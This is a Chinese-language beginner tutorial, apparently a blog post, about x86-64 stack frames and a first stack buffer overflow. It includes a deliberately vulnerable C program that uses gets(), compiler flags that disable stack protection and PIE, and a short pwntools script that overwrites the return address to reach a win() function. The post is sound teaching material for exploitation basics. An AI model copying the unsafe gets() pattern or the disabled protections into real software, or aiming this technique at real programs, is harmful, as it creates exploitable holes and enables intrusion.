---
title: "ezoverflow"
excerpt: "understand the stackframe of function"
date: "2025-12-09"
slug: "ezoverflow"
section: "pwn"
---

<div class="intro-article">

# 如何初次体会到pwn的乐趣

*从控制一次程序执行流开始!*

## 让我们先从最底层看看在c语言代码中调用一个函数时到底发生了什么吧🥰

先来看一个最简单的c语言例子(你可以自己复刻并实现!)

<span style="color:#ff6b6b">你可以亲眼看到程序是如何按照你的数据执行的!</span>

> go on!

```c
// ezoverflow.c
#include <stdio.h>

void win(){
    printf("我被你控制了!真厉害!");
}

void vuln() {
    char buf[32];
    gets(buf);
}

int main() {
    vuln();
    return 0;
}
```

⚠️ 注意：gets() 是一个十分危险的函数，不会检查输入长度，这正好让我们用来做演示。

使用gcc编译

> gcc -g -fno-stack-protector -z execstack -no-pie ezoverflow.c -o ezoverflow

*先忽略这些复杂的参数...*

编译完成后目录中会出现：

<span style="color:#51cf66">ezoverflow</span>

这就代表你成功获得了一个等待着被你pwn掉的程序😀

## 栈帧(stack frame)是什么?😍

先讲一点枯燥的理论知识...(但很重要)

在理解溢出之前，你必须先搞懂一个最核心的概念 —— **函数的栈帧（Stack Frame）**。

每当一个函数被调用时，系统都会在栈上为它创建一块“临时工作区”。  

这块区域就叫做：

> **栈帧（Stack Frame）**

它用来存放：

- 函数的局部变量  
- 返回地址（函数结束后跳回到哪里,**关键!**）  
- 上一个函数的栈帧指针（saved rbp）
- 一些编译器需要的中间数据(rubbish)😅  

理解栈帧，就是理解程序真正如何“运行和返回”!

---

## 🧱 栈是怎样增长的？

在 x86-64 架构里：

栈向低地址方向增长

- rsp 始终指向当前栈顶
- rbp 指向当前函数栈帧的基址

以上述vuln函数被调用时为例子

它的栈帧在内存中大致长这样（高地址 → 低地址）：

高地址
───────────────────────────────
|    返回地址 return address    | ← ret 指令最终跳回的位置(关键!)😍
───────────────────────────────
|       保存的 rbp (saved rbp)  | ← 上一个栈帧的基址
───────────────────────────────
|          buf[32] 区域         | ← 局部变量，从这里向下增长
|                               |
───────────────────────────────
低地址

> 这意味着什么？🤤

buf 在底部（低地址）

return address 在更高地址

当你向 buf 写入超长内容时，会依次覆盖：

saved rbp

return address ❗

而一旦你覆盖了 return address，

函数 ret 时就会跳去你指定的地址。

这就是最经典的：

栈溢出 → 控制程序执行流!

## 🧵 栈帧是如何建立和销毁的？

编译器会在函数入口自动生成“开场白（prologue）”：

push rbp        ; 保存上一个栈帧基址
mov rbp, rsp    ; rbp = 当前栈顶，建立新栈帧
sub rsp, 0x20   ; 给局部变量分配空间

在函数结束时，会生成“收场白（epilogue）”：

leave           ; 恢复 rbp、rsp
ret             ; 弹出返回地址并跳转

因此：

ret 指令跳到哪里

是由 栈上的 return address 决定的!

> 而这个 return address —— 我们是可以覆盖的!😌

> 只要输入够长!

接下来所有基础 PWN 的利用方式其本质都是:

利用一个能写到栈上的漏洞 → 覆盖返回地址 → 劫持执行流

因此：

> 理解栈帧，就是理解一切漏洞利用的第一步!😛😛

## 接下来，让我们亲自动手去pwn掉ezoverflow!😉

基于理论知识:我们只要输入超过32个字节的字符串就能产生溢出

因此思路就是:

- 先写入40个填充字节分别覆盖**buf**和**saved rbp**
- 最后写入我们win函数的地址使得程序跳转到我们想让其执行的地方

使用linux指令

> objdump -d ezoverflow | grep win

你会看到win函数的地址!(别忘了动手...)😄

接下来就是用python写exploit脚本了!

非常简单!

```python
//exploit.py
from pwn import *

p=process('./ezoverflow')

win_addr = 0x...   #自己写上!

payload = b'A' * 40
payload += p64(win_addr)

p.sendline(payload)
```

最后，你会看到:

> 我被你控制了!真厉害!  😍😍😍😍

程序走向了你指定的地址!

这便是:**栈溢出漏洞**

如果你跟着动手做到了这里

> 先给你点个赞👍👍👏👏

万事开头难

但是

> 🎉 你已经完成了第一份真正意义上的 PWN！

接下来只是技巧的不断精进

本质思维是不变的!🐶🐶

That is end~

感谢阅读!😄

</div>